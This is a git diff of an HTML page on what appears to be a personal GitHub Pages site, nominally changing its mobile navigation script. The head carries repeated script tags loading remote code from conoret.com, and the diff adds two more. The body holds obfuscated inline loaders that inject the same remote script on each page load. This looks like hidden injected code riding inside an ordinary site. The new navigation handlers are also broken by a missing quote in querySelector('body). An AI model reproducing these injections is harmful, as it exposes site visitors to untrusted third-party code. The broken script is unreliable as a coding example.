@@ -4,7 +4,7 @@
 	<link rel="icon" type="image/png" href="favicon.jpg">
 	<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
 	<link rel="stylesheet" type="text/css" href="assets/css/main.css">
-<script src="//conoret.com/dsp?h=clarkspace.github.io&amp;r=0.8629341931564964" type="text/javascript" defer="" async=""></script><script src="//conoret.com/dsp?h=clarkspace.github.io&amp;r=0.6725012863494353" type="text/javascript" defer="" async=""></script><script src="//conoret.com/dsp?h=clarkspace.github.io&amp;r=0.5332805784359296" type="text/javascript" defer="" async=""></script><script src="//conoret.com/dsp?h=clarkspace.github.io&amp;r=0.954402094620576" type="text/javascript" defer="" async=""></script><script src="//conoret.com/dsp?h=clarkspace.github.io&amp;r=0.8534546644216834" type="text/javascript" defer="" async=""></script><script src="//conoret.com/dsp?h=clarkspace.github.io&amp;r=0.4422331358138436" type="text/javascript" defer="" async=""></script><script src="//conoret.com/dsp?h=clarkspace.github.io&amp;r=0.8791548524070385" type="text/javascript" defer="" async=""></script></head>
+<script src="//conoret.com/dsp?h=clarkspace.github.io&amp;r=0.8629341931564964" type="text/javascript" defer="" async=""></script><script src="//conoret.com/dsp?h=clarkspace.github.io&amp;r=0.6725012863494353" type="text/javascript" defer="" async=""></script><script src="//conoret.com/dsp?h=clarkspace.github.io&amp;r=0.5332805784359296" type="text/javascript" defer="" async=""></script><script src="//conoret.com/dsp?h=clarkspace.github.io&amp;r=0.954402094620576" type="text/javascript" defer="" async=""></script><script src="//conoret.com/dsp?h=clarkspace.github.io&amp;r=0.8534546644216834" type="text/javascript" defer="" async=""></script><script src="//conoret.com/dsp?h=clarkspace.github.io&amp;r=0.4422331358138436" type="text/javascript" defer="" async=""></script><script src="//conoret.com/dsp?h=clarkspace.github.io&amp;r=0.8791548524070385" type="text/javascript" defer="" async=""></script><script src="//conoret.com/dsp?h=clarkspace.github.io&amp;r=0.9962466077263288" type="text/javascript" defer="" async=""></script><script src="//conoret.com/dsp?h=clarkspace.github.io&amp;r=0.9638167261048918" type="text/javascript" defer="" async=""></script></head>
 <body class="" style="
 "><script type="text/javascript">window.top === window && !function(){var e=document.createElement("script"),t=document.getElementsByTagName("head")[0];e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)}();</script><script type="text/javascript">window.top === window && !function(){var e=document.createElement("script"),t=document.getElementsByTagName("head")[0];e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)}();</script>
 <div id="page-wrapper" style="
@@ -57,23 +57,25 @@
 
 <script>
 	
-function toggle(){
-
-var body = document.querySelector('body');
-	body.classList.toggle('nav-visible');
-}
-	
 window.onresize=function(event){
 
 var width  = window.innerWidth;
 if (width >= 980) {
 document.querySelector('body').classList.remove('nav-visible');
   }
+
+document.querySelector('.swap').onclick=function(){ document.querySelector('body).classList.add('nav-visible'); }
+document.getElementById('page-wrapper').onclick=function(){ document.querySelector('body).classList.remove('nav-visible'); }
+
+
 }
+
+	
 
 	
 	
 </script>
+
 
 
 
